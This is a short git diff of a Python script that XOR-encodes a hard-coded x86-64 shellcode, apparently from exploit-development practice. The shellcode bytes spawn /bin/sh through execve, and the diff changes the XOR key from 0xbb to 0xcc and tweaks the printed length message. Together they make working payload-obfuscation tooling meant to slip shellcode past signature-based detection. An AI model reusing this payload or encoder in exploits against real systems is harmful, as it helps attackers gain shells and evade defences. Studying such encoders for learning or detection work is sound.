@@ -24,7 +24,6 @@ def Print_To_Hex(data):
 
 shellcode  = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
 
-print(len(shellcode))
 
 
 print("original shellcode:\n\"{0}\"\n".format(Print_To_Hex(shellcode)))
@@ -57,7 +56,7 @@ if len(shellcode) % 2 is 0:
 
 for x in temp:
         # XOR Encoding
-	y = x ^0xbb
+	y = x ^0xcc
 
 	encoded += '\\x'
         encoded += '{:02x}'.format(y)
@@ -74,7 +73,7 @@ encoded2 += "0xff,0xff"
 print("encoded bytearray:\n{0}\n".format(encoded2))
 
 
-print("encoded shellcode lenght = {0}".format(len(shellcode) * 2))
+print("encoded shellcode lenght  (eventualy 1 nop padded , not counted)  = {0}".format(len(shellcode) * 2))
 
 
 
